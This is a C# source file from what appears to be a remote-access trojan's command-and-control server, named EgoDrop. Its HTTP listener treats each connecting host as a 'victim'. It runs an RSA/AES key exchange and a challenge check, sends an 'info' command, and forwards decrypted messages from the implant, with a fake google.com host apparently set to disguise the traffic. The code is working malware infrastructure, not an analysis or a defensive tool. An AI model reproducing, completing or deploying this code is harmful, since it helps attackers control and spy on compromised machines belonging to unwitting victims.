using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace EgoDrop
{
    internal class clsHttpListener : clsListener
    {
        private TcpListener m_listener { get; set; }
        private CancellationTokenSource m_cts { get; set; }

        public clsHttpListener(string szName, int nPort, bool bSecure, string szDescription, string szHttpHost, clsSqlite.enHttpMethod httpMethod, string szHttpPath, string szHttpUA)
        {
            m_szName = szName;
            m_nPort = nPort;
            m_szDescription = szDescription;
            m_Protocol = clsSqlite.enListenerProtocol.HTTP;
            m_stListener = new clsSqlite.stListener(m_szName, m_Protocol, m_nPort, m_szDescription, DateTime.Now, szHttpHost, httpMethod, szHttpPath, szHttpUA);

            m_listener = new TcpListener(IPAddress.Any, nPort);
            m_cts = new CancellationTokenSource();
        }

        public override void fnStart()
        {
            try
            {
                Socket sktSrv = m_listener.Server;
                var hSafe = sktSrv.SafeHandle;
                if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
                    m_listener = new TcpListener(IPAddress.Any, m_nPort);

                m_listener.Start();
                _ = Task.Run(() => fnAcceptLoop(m_cts.Token));
                m_bIsListening = true;
                
            }
            catch (Exception ex)
            {
                
            }
        }

        public override void fnStop()
        {
            //base.fnStop();

            try
            {
                m_cts.Cancel();
                m_listener.Stop();
                m_bIsListening = false;
            }
            catch (Exception ex)
            {
                
            }
        }

        private async Task fnAcceptLoop(CancellationToken ct)
        {
            while (!ct.IsCancellationRequested && m_bIsListening)
            {
                try
                {
                    var client = await m_listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => fnHandleClient(client), ct);
                }
                catch (ObjectDisposedException) { break; }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Accept error: {ex.Message}");
                }
            }
        }

        private async Task fnHandleClient(TcpClient client)
        {
            using (client)
            {
                NetworkStream stream = client.GetStream();
                clsHttpPkt httpPkt = new clsHttpPkt("www.google.com", clsSqlite.enHttpMethod.POST, "/", "XX");
                clsVictim victim = new clsVictim(client.Client, stream, httpPkt, this);

                victim.fnHttpSend(1, 0, Convert.ToBase64String(victim.m_crypto.m_abRSAKeyPair.abPublicKey));

                int nRecv = 0;

                do
                {
                    try
                    {
                        string request = await fnReadHttpRequest(stream);
                        nRecv = request.Length;
                        if (nRecv == 0)
                            break;

                        if (string.IsNullOrEmpty(request))
                            return;

                        string[] parts = request.Split(new[] { "\r\n\r\n" }, 2, StringSplitOptions.None);
                        string header = parts[0];
                        string body = parts.Length > 1 ? parts[1] : "";

                        int contentLength = 0;
                        foreach (string line in header.Split("\r\n"))
                        {
                            if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
                            {
                                string value = line.Substring("Content-Length:".Length).Trim();
                                int.TryParse(value, out contentLength);
                            }
                        }

                        if (body.Length < contentLength)
                        {
                            int remaining = contentLength - Encoding.UTF8.GetByteCount(body);
                            byte[] buffer = new byte[remaining];
                            int read = await stream.ReadAsync(buffer, 0, buffer.Length);
                            body += Encoding.UTF8.GetString(buffer, 0, read);
                        }

                        if (!string.IsNullOrEmpty(body))
                        {
                            byte[] abBuffer = Convert.FromBase64String(body);
                            clsEDP edp = new clsEDP(abBuffer);

                            var headerInfo = edp.fnGetMsg();
                            string szMsg = Encoding.UTF8.GetString(headerInfo.abMsg);

                            if (headerInfo.nCommand == 0)
                            {
                                if (headerInfo.nParam == 0)
                                {

                                }
                            }
                            else if (headerInfo.nCommand == 1)
                            {
                                if (headerInfo.nParam == 1)
                                {
                                    byte[] abCipher = Convert.FromBase64String(szMsg);
                                    byte[] abPlain = victim.m_crypto.fnabRSADecrypt(abCipher);
                                    string szPlain = Encoding.UTF8.GetString(abPlain);

                                    var split = szPlain.Split('|');
                                    byte[] abKey = Convert.FromBase64String(split[0]);
                                    byte[] abIV = Convert.FromBase64String(split[1]);

                                    victim.m_crypto.fnAesSetNewKeyIV(abKey, abIV);

                                    //Validate
                                    string szChallenge = clsEZData.fnGenerateRandomStr();
                                    victim.m_crypto.m_szChallenge = szChallenge;
                                    victim.fnHttpSend(1, 2, clsEZData.fnStrE2B64(szChallenge));
                                }
                                else if (headerInfo.nParam == 3)
                                {
                                    string szPlain = clsEZData.fnB64D2Str(victim.m_crypto.fnszAESDecrypt(Convert.FromBase64String(szMsg)));

                                    if (string.Equals(victim.m_crypto.m_szChallenge, szPlain))
                                    {
                                        victim.fnSendCommand("info");
                                    }
                                }
                            }
                            else if (headerInfo.nCommand == 2)
                            {
                                if (headerInfo.nParam == 0)
                                {
                                    string szPlain = victim.m_crypto.fnszAESDecrypt(headerInfo.abMsg);
                                    List<string> lsMsg = szPlain.Split('|').Select(x => clsEZData.fnB64D2Str(x)).ToList();

                                    fnOnReceivedMessage(victim, lsMsg);
                                }
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                    }
                } while (nRecv > 0);

                fnOnVictimDisconnected(victim);
            }
        }

        private async Task<string> fnReadHttpRequest(NetworkStream stream)
        {
            byte[] buffer = new byte[8192];
            MemoryStream ms = new MemoryStream();

            while (true)
            {
                int bytes = await stream.ReadAsync(buffer, 0, buffer.Length);
                if (bytes <= 0)
                    return string.Empty;

                ms.Write(buffer, 0, bytes);
                string data = Encoding.UTF8.GetString(ms.ToArray());

                if (data.Contains("\r\n\r\n"))
                    return data;

                if (ms.Length > 1024 * 1024 * 10)
                    throw new Exception("Request too large.");
            }
        }
    }
}
